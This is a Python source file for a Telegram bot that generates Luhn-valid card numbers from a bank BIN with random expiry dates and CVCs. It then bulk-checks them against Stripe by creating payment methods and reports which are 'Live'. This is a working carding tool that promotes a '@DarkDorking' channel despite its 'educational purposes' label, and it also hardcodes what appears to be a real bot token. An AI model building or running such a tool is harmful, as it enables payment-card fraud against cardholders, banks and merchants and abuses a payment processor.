import nest_asyncio
nest_asyncio.apply()
import telegram
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
import stripe
import requests
import random
import string
import time
import os

# Configuration
TELEGRAM_TOKEN = "8071747780:AAF_oRPKCf38r2vBlgGEkPQzfQeFAsN5H0k"  # BotFather se mila token
ADMIN_IDS = [6972264549]  # Replace with your Telegram User ID(s)
BIN_LOOKUP_URL = "https://lookup.binlist.net/"  # Free BIN lookup API
SK_FILE = "sk.txt"  # File to store Stripe Secret Key

# Function to load/save SK
def load_sk():
    if os.path.exists(SK_FILE):
        with open(SK_FILE, "r") as f:
            sk = f.read().strip()
            if sk:
                stripe.api_key = sk
                return sk
    return None

def save_sk(sk):
    with open(SK_FILE, "w") as f:
        f.write(sk)
    stripe.api_key = sk

def remove_sk():
    if os.path.exists(SK_FILE):
        os.remove(SK_FILE)
    stripe.api_key = None

# Load SK on startup
load_sk()

# Luhn Algorithm for card generation
def luhn_checksum(card_number):
    def digits_of(n):
        return [int(d) for d in str(n)]
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10

def is_luhn_valid(card_number):
    return luhn_checksum(card_number) == 0

def generate_card_number(bin_prefix, length=16):
    card_number = bin_prefix + ''.join(random.choice(string.digits) for _ in range(length - len(bin_prefix) - 1))
    for i in range(10):
        candidate = card_number + str(i)
        if is_luhn_valid(candidate):
            return candidate
    return None

# BIN Lookup
def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        response = requests.get(f"{BIN_LOOKUP_URL}{bin_number}", headers={"Accept-Version": "3"})
        if response.status_code == 200:
            data = response.json()
            return {
                "bank": data.get("bank", {}).get("name", "Unknown"),
                "brand": data.get("brand", "Unknown"),
                "type": data.get("type", "Unknown"),
                "country": data.get("country", {}).get("name", "Unknown")
            }
        return {"error": "BIN lookup failed"}
    except Exception as e:
        return {"error": str(e)}

# Stripe Card Validation
def validate_card(card_number, exp_month, exp_year, cvc):
    try:
        payment_method = stripe.PaymentMethod.create(
            type="card",
            card={
                "number": card_number,
                "exp_month": exp_month,
                "exp_year": exp_year,
                "cvc": cvc,
            },
        )
        return {"status": "Live", "payment_method_id": payment_method.id}
    except stripe.error.CardError as e:
        return {"status": "Declined", "error": e.user_message}
    except Exception as e:
        return {"status": "Error", "error": str(e)}

# Telegram Bot Handlers
def start(update, context):
    user = update.effective_user
    welcome_message = (
        f"👋 *Welcome, {user.first_name}!* 👋\n"
        "This is a card validation and generation bot for educational purposes.\n"
        "Join our channel: @DarkDorking for updates!\n\n"
        "🔍 *Commands:*\n"
        "/chk <card_number>|<exp_month>|<exp_year>|<cvc> - Validate a card\n"
        "/gen <bin> - Generate 15 cards with given BIN\n"
        "Reply /chk to a /gen message to check all generated cards\n"
    )
    update.message.reply_text(welcome_message, parse_mode="Markdown")

def add_sk(update, context):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        update.message.reply_text("🚫 You are not authorized to use this command!", parse_mode="Markdown")
        return

    try:
        command = update.message.text.split(" ", 1)
        if len(command) < 2:
            update.message.reply_text("⚠️ Usage: /addsk <secret_key>", parse_mode="Markdown")
            return

        new_sk = command[1].strip()
        save_sk(new_sk)
        update.message.reply_text("✅ Stripe Secret Key updated successfully!", parse_mode="Markdown")
    except Exception as e:
        update.message.reply_text(f"⚠️ Error: {str(e)}", parse_mode="Markdown")

def remove_sk_command(update, context):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        update.message.reply_text("🚫 You are not authorized to use this command!", parse_mode="Markdown")
        return

    try:
        remove_sk()
        update.message.reply_text("✅ Stripe Secret Key removed successfully!", parse_mode="Markdown")
    except Exception as e:
        update.message.reply_text(f"⚠️ Error: {str(e)}", parse_mode="Markdown")

def check_card(update, context):
    # Check if SK is set
    if not stripe.api_key:
        update.message.reply_text(
            "⚠️ Stripe Secret Key is not set. Please contact @DarkDorking for support.",
            parse_mode="Markdown"
        )
        return

    try:
        # Check if it's a reply to a /gen message
        if update.message.reply_to_message and "/gen" in update.message.reply_to_message.text:
            original_message = update.message.reply_to_message.text
            # Parse generated cards from the message
            lines = original_message.split("\n")
            cards = []
            for line in lines:
                if "💳" in line:
                    card_data = line.replace("💳", "").strip().split(" | ")
                    if len(card_data) == 4:
                        cards.append({
                            "number": card_data[0].replace(" ", ""),
                            "exp_month": card_data[1],
                            "exp_year": card_data[2],
                            "cvc": card_data[3]
                        })

            if not cards:
                update.message.reply_text("⚠️ No valid cards found in the replied message!", parse_mode="Markdown")
                return

            # Real-time checking
            update.message.reply_text("🔄 *Checking 15 cards... Please wait...* 🔄", parse_mode="Markdown")
            message = update.message.reply_text("📊 *Results*:\nStarting...", parse_mode="Markdown")
            results = "📊 *Card Check Results* 📊\n\n"

            for i, card in enumerate(cards, 1):
                result = validate_card(
                    card["number"],
                    int(card["exp_month"]),
                    int(card["exp_year"]),
                    card["cvc"]
                )
                status = result["status"]
                result_text = (
                    f"💳 *Card {i}*: {card['number'][:6]}****{card['number'][-4:]} | "
                    f"{card['exp_month']}/{card['exp_year']} | {card['cvc']}\n"
                    f"{'✅' if status == 'Live' else '❌'} *Status*: {status}\n"
                )
                if status != "Live":
                    result_text += f"❗ *Error*: {result['error']}\n"
                else:
                    result_text += f"🆔 *Payment Method ID*: {result['payment_method_id']}\n"
                results += result_text + "\n"

                # Update message in real-time
                context.bot.edit_message_text(
                    chat_id=message.chat_id,
                    message_id=message.message_id,
                    text=results,
                    parse_mode="Markdown"
                )
                time.sleep(1)  # Avoid hitting API rate limits

            # Final BIN info
            bin_info = get_bin_info(cards[0]["number"])
            results += "\n🏦 *BIN Info*:\n"
            if "error" in bin_info:
                results += f"❌ *Error*: {bin_info['error']}\n"
            else:
                results += f"🏛 *Bank*: {bin_info['bank']}\n"
                results += f"💳 *Brand*: {bin_info['brand']}\n"
                results += f"📋 *Type*: {bin_info['type']}\n"
                results += f"🌍 *Country*: {bin_info['country']}\n"

            context.bot.edit_message_text(
                chat_id=message.chat_id,
                message_id=message.message_id,
                text=results,
                parse_mode="Markdown"
            )
            return

        # Manual card check: /chk <card_number>|<exp_month>|<exp_year>|<cvc>
        command = update.message.text.split(" ", 1)
        if len(command) < 2:
            update.message.reply_text("⚠️ Usage: /chk <card_number>|<exp_month>|<exp_year>|<cvc>")
            return

        card_details = command[1].split("|")
        if len(card_details) != 4:
            update.message.reply_text("⚠️ Invalid format! Use: <card_number>|<exp_month>|<exp_year>|<cvc>")
            return

        card_number, exp_month, exp_year, cvc = card_details
        card_number = card_number.replace(" ", "").strip()
        
        # Validate card with Stripe
        result = validate_card(card_number, int(exp_month), int(exp_year), cvc)
        
        # Get BIN info
        bin_info = get_bin_info(card_number)
        
        # Prepare response
        response = f"💳 *Card Validation Result* 💳\n\n"
        response += f"🔢 *Card Number*: {card_number[:6]}****{card_number[-4:]}\n"
        response += f"📅 *Expiry*: {exp_month}/{exp_year}\n"
        response += f"🔐 *CVC*: {cvc}\n\n"
        response += f"{'✅' if result['status'] == 'Live' else '❌'} *Status*: {result['status']}\n"
        if result["status"] != "Live":
            response += f"❗ *Error*: {result['error']}\n"
        else:
            response += f"🆔 *Payment Method ID*: {result['payment_method_id']}\n"
        
        response += "\n🏦 *BIN Info*:\n"
        if "error" in bin_info:
            response += f"❌ *Error*: {bin_info['error']}\n"
        else:
            response += f"🏛 *Bank*: {bin_info['bank']}\n"
            response += f"💳 *Brand*: {bin_info['brand']}\n"
            response += f"📋 *Type*: {bin_info['type']}\n"
            response += f"🌍 *Country*: {bin_info['country']}\n"

        update.message.reply_text(response, parse_mode="Markdown")
    except Exception as e:
        update.message.reply_text(f"⚠️ Error: {str(e)}", parse_mode="Markdown")

def generate_cards(update, context):
    # Check if SK is set (optional for generation, but good for consistency)
    if not stripe.api_key:
        update.message.reply_text(
            "⚠️ Stripe Secret Key is not set. Please contact @DarkDorking for support.",
            parse_mode="Markdown"
        )
        return

    try:
        # Input format: /gen 424242
        command = update.message.text.split(" ", 1)
        if len(command) < 2:
            update.message.reply_text("⚠️ Usage: /gen <bin>")
            return

        bin_prefix = command[1].strip()
        if not bin_prefix.isdigit() or len(bin_prefix) < 6:
            update.message.reply_text("⚠️ BIN must be at least 6 digits!")
            return

        # Generate 15 cards
        response = f"🛠 *Generated Cards* 🛠\n\n"
        cards = []
        for _ in range(15):
            card_number = generate_card_number(bin_prefix)
            if card_number:
                exp_month = random.randint(1, 12)
                exp_year = random.randint(2025, 2030)
                cvc = ''.join(random.choice(string.digits) for _ in range(3))
                response += f"💳 {card_number} | {exp_month:02d} | {exp_year} | {cvc}\n"
                cards.append({"number": card_number, "exp_month": exp_month, "exp_year": exp_year, "cvc": cvc})
            else:
                response += "❌ Failed to generate a valid card\n"
        
        # Get BIN info for the prefix
        bin_info = get_bin_info(bin_prefix)
        response += "\n🏦 *BIN Info*:\n"
        if "error" in bin_info:
            response += f"❌ *Error*: {bin_info['error']}\n"
        else:
            response += f"🏛 *Bank*: {bin_info['bank']}\n"
            response += f"💳 *Brand*: {bin_info['brand']}\n"
            response += f"📋 *Type*: {bin_info['type']}\n"
            response += f"🌍 *Country*: {bin_info['country']}\n"

        response += "\nℹ️ Reply with /chk to validate all generated cards!"
        update.message.reply_text(response, parse_mode="Markdown")
    except Exception as e:
        update.message.reply_text(f"⚠️ Error: {str(e)}", parse_mode="Markdown")

def main():
    # Updater initialize
    updater = Updater(TELEGRAM_TOKEN, use_context=True)
    dp = updater.dispatcher

    # Handlers add karein
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("addsk", add_sk))
    dp.add_handler(CommandHandler("removesk", remove_sk_command))
    dp.add_handler(CommandHandler("chk", check_card))
    dp.add_handler(CommandHandler("gen", generate_cards))

    # Start polling
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
